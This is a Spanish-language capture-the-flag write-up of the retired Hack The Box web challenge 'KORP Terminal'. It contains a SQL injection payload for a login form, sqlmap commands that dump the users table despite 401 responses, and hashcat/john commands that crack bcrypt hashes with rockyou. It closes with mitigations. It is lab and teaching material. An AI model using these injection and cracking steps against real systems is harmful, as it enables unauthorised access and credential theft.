---
challenge: KORP Terminal
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, mysql, bcrypt, sqlmap, cyber-apocalypse-2024]
---

# KORP Terminal — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Un login que lanza la consulta por concatenación: una comilla produce un **error de MySQL** en la respuesta. La aplicación contesta **401** aunque el error se muestre, así que `sqlmap` necesita `--ignore-code 401`. Se vuelca `korp_terminal.users`, el hash **bcrypt** (`$2b$12$`) cae con rockyou y se entra como `admin`.

## Enunciado y superficie

Instancia web con una única pantalla de terminal y dos campos (`username`, `password`) enviados por `POST`. Sin código fuente.

## Reconocimiento

```bash
curl -s http://<IP>:<PORT>/ | head -40
# guardar la petición del login en login.req desde Burp para conservar cabeceras
```

## Explicación del fallo

```text
username=admin'&password=x
```

```text
(1064, "You have an error in your SQL syntax ... near '' at line 1")
```

El error viaja en la respuesta, pero el código HTTP es **401**: cualquier herramienta que aborte en 401 (incluido `sqlmap` por defecto) concluye que el endpoint no es inyectable. Se ignora explícitamente.

## Explotación

```bash
sqlmap -r login.req --batch --ignore-code 401 --dbs
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal --tables
sqlmap -r login.req --batch --ignore-code 401 -D korp_terminal -T users --dump
```

```text
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
| 1  | admin    | $2b$12$<hash>                                                |
+----+----------+--------------------------------------------------------------+
```

El prefijo `$2b$12$` es **bcrypt con coste 12**: lento por diseño, así que sólo tiene sentido un diccionario razonable.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
# o: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Con `admin:<password>` se entra y la respuesta trae la flag.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags ni credenciales.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`--ignore-code 401`**: sin ese flag, `sqlmap` abandona al considerar el endpoint inaccesible.
- **`-r` con la petición completa**: conserva método, cookies y cabeceras; la inyección va en el cuerpo.
- **bcrypt no se "rompe"**: se adivina con un diccionario; el coste 12 limita la velocidad.

- Un error de base de datos visible en producción es un mapa para el atacante.
- Un código de estado engañoso no detiene la inyección: la respuesta sigue siendo válida.
- Mitigación: consultas parametrizadas, errores genéricos y bcrypt/argon2 con contraseñas fuertes.
